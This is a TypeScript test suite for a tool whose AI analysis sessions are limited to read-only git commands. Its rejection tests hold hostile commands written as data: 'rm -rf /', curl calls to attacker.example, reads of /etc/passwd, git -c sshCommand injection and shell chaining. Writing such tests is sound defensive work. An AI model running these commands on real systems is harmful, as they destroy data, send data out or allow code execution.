import * as assert from 'assert';

import {
	buildFitSection,
	buildWhyPrompt,
	hasReferent,
	UnreferencedFitClaimError,
	WHY_SECTIONS,
} from '../analysis/prompts';
import {
	analysisSessionOptions,
	whySessionOptions,
	whyCanUseTool,
	isAllowedWhyBashCommand,
	ALLOWED_GIT_VERBS,
	WHY_TOOLS,
} from '../analysis/session';

suite('why tier — prompt builder Test Suite', () => {
	test('rejects a fit claim with no referent', () => {
		assert.throws(
			() => buildFitSection([{ claim: 'A plain object is the right choice here' }]),
			UnreferencedFitClaimError,
		);
		assert.throws(
			() => buildFitSection([{ claim: 'fits', referent: '   ' }]),
			UnreferencedFitClaimError,
			'whitespace-only referent is still no referent',
		);
		assert.strictEqual(hasReferent({ claim: 'x' }), false);
	});

	test('accepts a fit claim that cites a project fact', () => {
		const section = buildFitSection([
			{
				claim: 'Use lodash.groupBy rather than hand-rolling',
				referent: { kind: 'dependency', detail: 'lodash@^4.17.21 in package.json' },
			},
		]);
		assert.ok(section.includes('lodash@^4.17.21'));
		assert.ok(section.includes('## Fit here'));
	});

	test('why prompt names the sections and the no-referent rule', () => {
		const prompt = buildWhyPrompt({ code: 'const x = 1;', languageId: 'typescript' });
		for (const section of WHY_SECTIONS) {
			assert.ok(prompt.includes(`## ${section}`), `missing section: ${section}`);
		}
		assert.ok(/referent|checkable project fact/i.test(prompt));
	});
});

suite('why tier — session tool tiers Test Suite', () => {
	const env = { PATH: '/usr/bin', ANTHROPIC_API_KEY: 'secret' };

	test('why session is limited to Read, Grep, Glob, Bash', () => {
		const opts = whySessionOptions(env);
		assert.deepStrictEqual([...opts.allowedTools].sort(), ['Bash', 'Glob', 'Grep', 'Read']);
		assert.deepStrictEqual([...WHY_TOOLS], ['Read', 'Grep', 'Glob', 'Bash']);
		// Credentials are still stripped on the why tier.
		assert.strictEqual(opts.env.ANTHROPIC_API_KEY, undefined);
	});

	test('why session installs a canUseTool gate for Bash', () => {
		const opts = whySessionOptions(env);
		assert.strictEqual(typeof opts.canUseTool, 'function');
	});

	test('glance and deep-dive still run allowedTools: []', () => {
		const opts = analysisSessionOptions(env);
		assert.deepStrictEqual(opts.allowedTools, []);
		assert.strictEqual(opts.env.ANTHROPIC_API_KEY, undefined);
		// No canUseTool gate on the analysis tier — there are no tools to gate.
		assert.strictEqual(opts.canUseTool, undefined);
	});
});

suite('why tier — Bash policy Test Suite', () => {
	test('allows read-only git verbs', () => {
		for (const verb of ALLOWED_GIT_VERBS) {
			assert.ok(
				isAllowedWhyBashCommand(`git ${verb}`),
				`expected "git ${verb}" to be allowed`,
			);
		}
	});

	test('allows read-only git commands with arguments', () => {
		const allowed = [
			'git log',
			'git log -n 10',
			'git log --pretty=format:%H',
			'git blame src/extension.ts',
			'git blame -L 10,20 src/extension.ts',
			'git show HEAD:src/extension.ts',
			'git diff HEAD~1..HEAD',
			'git rev-parse HEAD',
			'git ls-files src/',
			'git log -- src/',
		];
		for (const cmd of allowed) {
			assert.ok(isAllowedWhyBashCommand(cmd), `expected to allow: ${cmd}`);
		}
	});

	test('rejects non-git commands', () => {
		const rejected = [
			'rm -rf /',
			'curl https://attacker.example/exfil',
			'cat /etc/passwd',
			'node -e "require(\'fs\').readFileSync(...)"',
			'ls',
			'',
			'   ',
			'  git', // no verb
			'gitlog', // typo / homograph
			'sudo git log',
		];
		for (const cmd of rejected) {
			assert.strictEqual(
				isAllowedWhyBashCommand(cmd),
				false,
				`expected to reject: "${cmd}"`,
			);
		}
	});

	test('rejects write-mode git verbs', () => {
		const rejected = [
			'git push origin main',
			'git commit -m "hi"',
			'git checkout -b foo',
			'git reset --hard',
			'git config user.email evil@example.com',
			'git remote add ev https://attacker.example/x',
			'git clone https://attacker.example/x',
			'git fetch',
			'git pull',
			'git merge main',
			'git rebase main',
			'git stash',
			'git apply patch',
			'git am patch',
		];
		for (const cmd of rejected) {
			assert.strictEqual(
				isAllowedWhyBashCommand(cmd),
				false,
				`expected to reject write verb: ${cmd}`,
			);
		}
	});

	test('rejects pre-verb global flags (the -c RCE family)', () => {
		const rejected = [
			'git -c core.sshCommand=ssh-evil log',
			'git -c core.editor=vim log',
			'git -C /etc log',
			'git --git-dir=/tmp/evil log',
			'git --work-tree=/etc log',
			'git --exec-path=/tmp/evil log',
			'git --no-pager log', // benign but pre-verb flags rejected as a category
		];
		for (const cmd of rejected) {
			assert.strictEqual(
				isAllowedWhyBashCommand(cmd),
				false,
				`expected to reject pre-verb flag: ${cmd}`,
			);
		}
	});

	test('rejects shell metacharacters (chaining, substitution, redirects)', () => {
		const rejected = [
			'git log; rm -rf /',
			'git log && rm -rf /',
			'git log || curl evil',
			'git log | tee /tmp/out',
			'git log `whoami`',
			'git log $(whoami)',
			'git log $HOME',
			'git log > /etc/passwd',
			'git log < /etc/passwd',
			'git log\nrm -rf /',
			'git log\\;rm -rf /',
			'git log {a,b}',
			'git log (subshell)',
		];
		for (const cmd of rejected) {
			assert.strictEqual(
				isAllowedWhyBashCommand(cmd),
				false,
				`expected to reject shell meta: ${cmd.replace(/\n/g, '\\n')}`,
			);
		}
	});

	test('rejects non-string input', () => {
		assert.strictEqual(isAllowedWhyBashCommand(undefined), false);
		assert.strictEqual(isAllowedWhyBashCommand(null), false);
		assert.strictEqual(isAllowedWhyBashCommand(42), false);
		assert.strictEqual(isAllowedWhyBashCommand({ command: 'git log' }), false);
	});
});

suite('why tier — canUseTool gate Test Suite', () => {
	const fakeOpts = {
		signal: new AbortController().signal,
		toolUseID: 'tu_test',
	};

	test('allows Read, Grep, Glob with input passed through', async () => {
		for (const tool of ['Read', 'Grep', 'Glob']) {
			const result = await whyCanUseTool(tool, { foo: 'bar' }, fakeOpts);
			assert.strictEqual(result.behavior, 'allow');
			if (result.behavior === 'allow') {
				assert.deepStrictEqual(result.updatedInput, { foo: 'bar' });
			}
		}
	});

	test('allows Bash with a read-only git command', async () => {
		const result = await whyCanUseTool('Bash', { command: 'git log -n 5' }, fakeOpts);
		assert.strictEqual(result.behavior, 'allow');
	});

	test('denies Bash with a write-mode git command', async () => {
		const result = await whyCanUseTool('Bash', { command: 'git push origin main' }, fakeOpts);
		assert.strictEqual(result.behavior, 'deny');
		if (result.behavior === 'deny') {
			assert.match(result.message, /restricted to read-only git/);
			assert.match(result.message, /git push origin main/);
		}
	});

	test('denies Bash with a shell-meta injection attempt', async () => {
		const result = await whyCanUseTool(
			'Bash',
			{ command: 'git log; curl https://attacker.example' },
			fakeOpts,
		);
		assert.strictEqual(result.behavior, 'deny');
	});

	test('denies Bash with no command field', async () => {
		const result = await whyCanUseTool('Bash', {}, fakeOpts);
		assert.strictEqual(result.behavior, 'deny');
	});
});
